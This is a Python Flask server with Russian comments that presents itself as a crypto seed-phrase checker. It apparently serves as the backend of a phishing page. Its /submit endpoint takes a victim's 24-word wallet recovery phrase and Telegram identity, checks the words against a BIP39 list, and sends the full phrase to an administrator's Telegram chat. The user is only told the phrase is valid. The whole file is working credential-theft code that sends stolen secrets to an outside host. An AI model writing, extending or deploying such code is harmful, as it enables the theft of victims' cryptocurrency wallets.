from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import os
import json

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = os.environ.get("ADMIN_ID")

# Загружаем BIP39 словарь
def load_bip39_words():
    try:
        with open('bep39.txt', 'r', encoding='utf-8') as f:
            words = set()
            for line in f:
                line = line.strip().lower()
                if line:
                    if '. ' in line:
                        word = line.split('. ')[-1].strip()
                    else:
                        word = line
                    words.add(word)
            print(f"✅ Загружено {len(words)} слов из BIP39")
            return words
    except Exception as e:
        print(f"⚠️ Ошибка загрузки словаря: {e}")
        return set()

BIP39_WORDS = load_bip39_words()

def check_seed_basic(words_list):
    """Базовая проверка seed фразы"""
    
    if len(words_list) != 24:
        return {"valid": False, "error": f"Нужно 24 слова, получено {len(words_list)}"}
    
    # Проверка слов из словаря
    invalid_words = []
    for word in words_list:
        if word not in BIP39_WORDS:
            invalid_words.append(word)
    
    if invalid_words:
        return {"valid": False, "error": f"Слова не в BIP39: {', '.join(invalid_words[:5])}"}
    
    return {"valid": True}

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.json
        words = data.get('words', [])
        username = data.get('username', 'без_имени')
        first_name = data.get('first_name', '')
        user_id = data.get('user_id')
        
        print(f"📥 Получены данные от @{username}")
        print(f"📝 Количество слов: {len(words)}")
        
        # Проверяем seed фразу
        check_result = check_seed_basic(words)
        
        if not check_result.get("valid"):
            print(f"❌ Невалидная фраза: {check_result.get('error')}")
            return jsonify({
                'status': 'error', 
                'message': check_result.get('error')
            }), 400
        
        print("✅ Фраза валидна, отправляю админу...")
        
        # Отправляем админу через Telegram API
        text = f"<b>📨 НОВЫЕ ДАННЫЕ</b>\n\n"
        if first_name:
            text += f"👤 Имя: {first_name}\n"
        text += f"📱 Username: @{username}\n"
        text += f"🆔 ID: {user_id}\n\n"
        text += f"<b>🔑 SEED ФРАЗА (24 слова):</b>\n"
        text += f"<code>{' '.join(words)}</code>\n\n"
        text += f"<b>📝 ПО СЛОВАМ:</b>\n"
        for i, word in enumerate(words, 1):
            text += f"{i:2}. <code>{word}</code>\n"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        response = requests.post(url, json={
            'chat_id': ADMIN_ID, 
            'text': text, 
            'parse_mode': 'HTML'
        })
        
        if response.status_code == 200:
            print("✅ Сообщение админу отправлено")
            return jsonify({'status': 'ok', 'message': 'Seed фраза валидна'}), 200
        else:
            print(f"❌ Ошибка отправки админу: {response.text}")
            return jsonify({'status': 'error', 'message': 'Ошибка отправки'}), 500
        
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
